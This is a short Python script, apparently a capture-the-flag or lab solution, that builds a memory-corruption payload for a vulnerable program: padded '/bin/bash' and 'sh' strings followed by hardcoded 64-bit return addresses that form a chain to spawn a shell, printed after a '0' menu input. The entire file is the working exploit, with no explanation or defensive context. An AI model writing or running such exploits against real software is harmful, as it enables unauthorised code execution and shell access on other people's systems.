import sys
import struct

# Construct the payload
bin_sh = b"/bin/bash\0" + b"\0" * 54
arg = b"sh\0" + b"\0" * 61
payload = (
    arg
    + bin_sh
    + b"\0" * 64
    + b"\0" * 2 * 64
    + b"\0" * 16
    + struct.pack("<Q", 0x7FFFFFFFD8FC)
    + struct.pack("<Q", 0x7FFFF7EA3440)
    + struct.pack("<Q", 0x7FFFF7EA3440)
    + struct.pack("<Q", 0x7FFFF7EA3440)
    + struct.pack("<Q", 0x7FFFF7E1A490)
    + b"\n"
)

# Write "0" followed by the payload to stdin
sys.stdout.write("0\n")
sys.stdout.buffer.write(payload)
